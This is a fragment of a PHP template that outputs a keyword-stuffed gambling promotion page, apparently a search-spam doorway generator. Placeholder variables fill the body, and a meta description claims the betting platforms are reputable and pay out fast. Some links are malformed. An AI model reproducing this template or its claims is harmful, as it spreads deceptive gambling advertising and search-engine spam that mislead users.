<meta name="description" content="$lefta1 采用国际正规平台,$lefta2 与bbin平台,AG平台,EA平台进行 $lefta1 技术合作,信誉高,提款快,$lefta2 共同打造亚洲最佳博彩娱乐平台。">
<style>*{line-height:150%;list-style-type:none}.s12{font-size:12px}.w880{width:960px;margin-left:auto;margin-right:auto;height:auto}.tcenter{text-align:center}.li li{width:180px;margin-left:10px;overflow:hidden;float:left;height:18px;line-height:18px}</style>
</head>
<body>
<h2 class="w1000 tcenter">$lefta1</h2>
<div align="center">
	<table border="0" class="w880 s12 li" id="table2" cellspacing="0" cellpadding="0" height="188">
		<tr>
			<td colspan="2"  align="left"><a href="index.php">白小姐主页</a>-&gt;$lefta1 详细内容<hr/></td>
		</tr>
		<tr>
			<td height="18" colspan="2"  align="left">发布时间：{$showtime} 来源：$lefta1 作者：$lefta2  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $left0  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $left3 <hr/></td>
		</tr>
		<tr>
			<td bgcolor="#fdfddf" height="27" colspan="2"  align="left">导读：$leftt1$leftt2$leftt3$leftt4</td>
		</tr>
		<tr>
			<td height="45" valign="top" align="left">$leftt5$leftt6$leftt7$lefta1$leftt8$leftt9$leftt10$leftt11$leftt12$leftt13$leftt14$leftt15$leftt16<br>  $leftt17$leftt18$leftt19$lefta1$leftt20$leftt21$leftt22$leftt23$leftt24$leftt25$leftt26$leftt27$leftt28<br>  $leftt29$leftt30$leftt31$leftt32$leftt33$leftt34$lefta1$leftt35$leftt36$leftt37$leftt38$leftt39$leftt40<br>  $leftt41$leftt42$leftt43$leftt44$leftt45$leftt46$leftt47$leftt48$leftt49$leftt50$lefta1$leftt51$leftt52</td>
			<td height="45">
			<embed src="http://player.youku.com/player.php/sid/XMjU4NjI2OTI4/v.swf"
width="480" height="220" align="top"></td>
		</tr>
				<tr>
			<td colspan="2">
			<table class="w880 s12 li" id="table2"  width="100%" id="table3" cellspacing="0" cellpadding="0" bgcolor="#FDFDDF">
				<tr>
					<td><ul>
<li>·<a href='?id=004&keyword={$sq31}' title="$lefta3" target='_blank'>$lefta3</a></li>
<li>·<a href='?id=004&keyword={$sq32}' title="$lefta4" target='_blank'>$lefta4</a></li>
<li>·<a href='?id=004&keyword={$sq33}' title="$lefta5" target='_blank'>$lefta5</a></li>
<li>·<a href='?id=004&keyword={$sq34}' title="$lefta6" target='_blank'>$lefta6</a></li>
<li>·<a href='?id=004&keyword={$sq35}' title="$lefta7" target='_blank'>$lefta7</a></li>
<li>·<a href='?id=004&keyword={$sq36}' title="$lefta8" target='_blank'>$lefta8</a></li>
<li>·<a href='?id=004&keyword={$sq37}' title="$lefta9" target='_blank'>$lefta9</a></li>
<li>·<a href='?id=004&keyword={$sq38}' title="$lefta10" target='_blank'>$lefta10</a></li>
</ul></td>
					<td><ul>
<li >·<a href='?id=004&keyword={$sq39}' title="$lefta11" target='_blank'>$lefta11</a></li>
<li >·<a href='?id=004&keyword={$sq40}l' title="$lefta12" target='_blank'>$lefta11</a></li>
<li >·<a href='h?id=004&keyword={$sq41}' title="$lefta13" target='_blank'>$lefta13</a></li>
<li >·<a href='?id=004&keyword={$sq42}' title="$lefta14" target='_blank'>$lefta14</a></li>
<li >·<a href='?id=004&keyword={$sq43}' title="$lefta15" target='_blank'>$lefta15</a></li>
<li >·<a href='?id=004&keyword={$sq44}' title="$lefta16" target='_blank'>$lefta16</a></li>
<li >·<a href='?id=004&keyword={$sq45}' title="$lefta17" target='_blank'>$lefta17</a></li>
<li >·<a href='?id=004&keyword={$sq46}' title="$lefta18" target='_blank'>$lefta18</a></li>
</ul></td>
					<td><ul>
<li >·<a href='?id=004&keyword={$sq47}' title="$lefta19" target='_blank'>$lefta19</a></li>
<li >·<a href='?id=004&keyword={$sq48}l' title="$lefta20" target='_blank'>$lefta20</a></li>
<li >·<a href='h?id=004&keyword={$sq49}' title="$lefta21" target='_blank'>$lefta21</a></li>
<li >·<a href='?id=004&keyword={$sq50}' title="$lefta22" target='_blank'>$lefta22</a></li>
<li >·<a href='?id=004&keyword={$sq51}' title="$lefta23" target='_blank'>$lefta23</a></li>
<li >·<a href='?id=004&keyword={$sq52}' title="$lefta24" target='_blank'>$lefta24</a></li>
<li >·<a href='?id=004&keyword={$sq53}' title="$lefta25" target='_blank'>$lefta25</a></li>
<li >·<a href='?id=004&keyword={$sq54}' title="$lefta36" target='_blank'>$lefta26</a></li>
</ul></td>
					<td><ul>
<li >·<a href='?id=004&keyword={$sq55}' title="$lefta27" target='_blank'>$lefta27</a></li>
<li >·<a href='?id=004&keyword={$sq56}l' title="$lefta28" target='_blank'>$lefta28</a></li>
<li >·<a href='h?id=004&keyword={$sq57}' title="$lefta29" target='_blank'>$lefta29</a></li>
<li >·<a href='?id=004&keyword={$sq58}' title="$lefta30" target='_blank'>$lefta30</a></li>
<li >·<a href='?id=004&keyword={$sq59}' title="$lefta31" target='_blank'>$lefta31</a></li>
<li >·<a href='?id=004&keyword={$sq60}' title="$lefta32" target='_blank'>$lefta32</a></li>
<li >·<a href='?id=004&keyword={$sq61}' title="$lefta33" target='_blank'>$lefta33</a></li>
<li >·<a href='?id=004&keyword={$sq62}' title="$lefta34" target='_blank'>$lefta34</a></li>
</ul></td>
					<td><ul>
<li >·<a href='?id=004&keyword={$sq63}' title="$lefta35" target='_blank'>$lefta35</a></li>
<li >·<a href='?id=004&keyword={$sq64}l' title="$lefta36" target='_blank'>$lefta36</a></li>
<li >·<a href='h?id=004&keyword={$sq65}' title="$lefta37" target='_blank'>$lefta37</a></li>
<li >·<a href='?id=004&keyword={$sq66}' title="$lefta38" target='_blank'>$lefta38</a></li>
<li >·<a href='?id=004&keyword={$sq67}' title="$lefta39" target='_blank'>$lefta39</a></li>
<li >·<a href='?id=004&keyword={$sq68}' title="$lefta40" target='_blank'>$lefta40</a></li>
<li >·<a href='?id=004&keyword={$sq69}' title="$lefta41" target='_blank'>$lefta41</a></li>
<li >·<a href='?id=004&keyword={$sq70}' title="$lefta42" target='_blank'>$lefta42</a></li>
</ul></td>
				</tr>
			</table>
			</td>
		</tr>
<tr><td height="27" colspan="2"  align="left">按字母检索:<A href="index.php?list=1">A</A>
		<A href="index.php?list=2">B</A>
		<A href="index.php?list=3">C</A>
		<A href="index.php?list=4">D</A>
		<A href="index.php?list=5">E</A>
		<A href="index.php?list=6">F</A>
		<A href="index.php?list=7">G</A>
		<A href="index.php?list=8">H</A>
		<A href="index.php?list=9">I</A>
		<A href="index.php?list=10">J</A>
		<A href="index.php?list=11">K</A>
		<A href="index.php?list=12">L</A>
		<A href="index.php?list=13">M</A>
		<A href="index.php?list=14">N</A>
		<A href="index.php?list=15">O</A>
		<A href="index.php?list=16">P</A>
		<A href="index.php?list=17">Q</A>
		<A href="index.php?list=18">R</A>
		<A href="index.php?list=19">S</A>
		<A href="index.php?list=20">T</A>
		<A href="index.php?list=21">W</A>
		<A href="index.php?list=22">U</A>
		<A href="index.php?list=23">V</A>
		<A href="index.php?list=24">X</A>
		<A href="index.php?list=25">Y</A>
		<A href="index.php?list=26">Z</A>
		<A href="index.php?list=27">AA</A>
		<A href="index.php?list=28">AB</A>
		<A href="index.php?list=29">AC</A>
		<A href="index.php?list=30">AD</A>
		<A href="index.php?list=31">AF</A>
		<A href="index.php?list=32">AG</A>
		<A href="index.php?list=33">AH</A>
		<A href="index.php?list=34">AI</A>
		<A href="index.php?list=35">AJ</A>
		<A href="index.php?list=36">AK</A>
		</td></tr>
	</table>
</div>
<div id="table2">
	<p align="center"><a href="?id=004&keyword={$sq71}" target=_blank>网站简介</a> | <a href="?id=004&keyword={$sq72}" target="_blank">联系方法</a> | <a href="?id=004&keyword=0327_{$sq73}" target="_blank">隐私保护</a> | <a href="?id=004&keyword={$sq74}" target="_blank">客服论坛</a> | <a href="?id=004&keyword={$sq75}" target="_blank">相关法律</a> | <a href="?id=004&keyword={$sq76}" target="_blank">加入我们</a> | <a onclick="this.style.behavior='url(#default#homepage)';this.setHomePage('?id=004&keyword={$sq77}');" href=""+document.location.href+"#" target=_self>设为首页</a> |<br>Copyright <a href="http://www.baidu.com/">百度</a> Your WebSite. Some Rights Reserved. 辽ICP备110082888号</div>
</body>
</html>




END;
echo $moban;
}
?>    
</body></html></body></html>